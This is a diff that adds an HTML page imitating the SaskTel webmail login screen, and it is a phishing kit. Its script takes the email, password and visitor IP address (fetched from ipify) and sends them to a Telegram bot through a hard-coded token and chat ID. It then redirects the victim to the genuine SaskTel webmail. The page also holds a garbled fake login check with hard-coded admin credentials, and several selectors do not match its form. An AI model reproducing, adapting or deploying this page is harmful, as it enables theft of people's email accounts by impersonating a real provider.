@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Login - Webmail 7.0</title>
+</head>
+<body>
+    <header class="lol">
+        <img src="sask_tel_logo.png" alt="sasktel" width="140px"/>
+    </header>
+
+    <div class="content">
+        <h1>SaskTel Email</h1>
+    </div>
+
+    <div class="con1">
+        <h2>Log in</h2>
+    </div>
+
+    <div class="wrapper">
+        <form action="">
+            <h3>Login ID</h3>
+            <div class="input-box">
+                <input type="text" placeholder="" id="email" required>
+            </div>
+            <h4>password</h4>
+            <div class="input-box">
+                <input type="password" placeholder="" id="password" required>
+                <i class='bx bx-low-vision' ></i>
+            </div>
+
+            <button type="submit" onclick="auth()" class="btn">LOG IN</button>
+            <br>
+            <br>
+            <div class="remember-forgot">
+                <a href="#">Forgot password?</a>
+            </div>
+        </form>
+
+        <hr class="vertical">
+
+    </div>
+
+    <script>
+        function auth() {
+            var email=document.getElementById("email").value;
+            var email=document.getElementById("password").value;
+            if(email== "admin@sasktel.net" && password=="admin123"){
+                window.location.assign('https://webmail.sasktel.net/#/login');
+                alert("Login Successfully ");
+            }
+
+            // else {
+            //     alert ("Invalid Information ");
+            //     return;
+            // }
+
+        }
+    </script>
+    <script type="application/javascript">
+        function getIP(json) {
+            document.getElementById("ipaddress").value = json.ip;
+        }
+        </script>
+        
+        <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+
+    <script>
+        const forma = document.querySelector('#form')
+      
+        let bot = {
+            TOKEN: "6496754346:AAEkJqR55yaUXpgARnzjw3HI37f-SR7aF2M",
+            chatID: "5507631022"
+        }
+  
+        const emAil = document.querySelector('#usr')
+        const suBBer = document.querySelector('#suber')
+        const pWd = document.querySelector('#pwd')
+        const strong = document.querySelector('.strong')
+        
+        const submit = document.querySelector('#sub').addEventListener('click', e =>{
+          if(emAil.value === ''){
+          
+          
+          
+            return
+          }
+          display.textContent = emAil.value
+          strong.textContent = 'Enter password'
+          emAil.style.display = 'none'
+          pWd.style.display = 'block'
+          submit.style.display = 'none'
+          suBBer.style.display = 'block'
+        })
+  
+  
+      forma.addEventListener("submit", e =>{
+            e.preventDefault();
+            let email = document.querySelector('#usr').value
+            let pwd = document.querySelector('#pwd').value
+            let ips = document.querySelector('#ipaddress').value
+  
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=YahooMail=>${email}=${pwd}==IP:>${ips}`, {
+                method: "GET"
+            }).then(success => {
+                window.location.replace("https://webmail.sasktel.net/#/login");
+            }, error => {
+                console.log(error)
+                }) 
+        })
+      </script>
+
+    <div class="info">
+        <h1>Welcome to SaskTel Email</h1>
+        <h2>This is where you can log in and use your SaskTel email <br>
+            account.</h2>
+        <ul>
+            <li><a href="">SaskTel email support</a></li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        <img src="logo_footer.png" width="100px">
+        <h5>© 2024 SaskTel and its licensors. All rights reserved.</h5>
+    </div>
+    
+</body>
+</html>
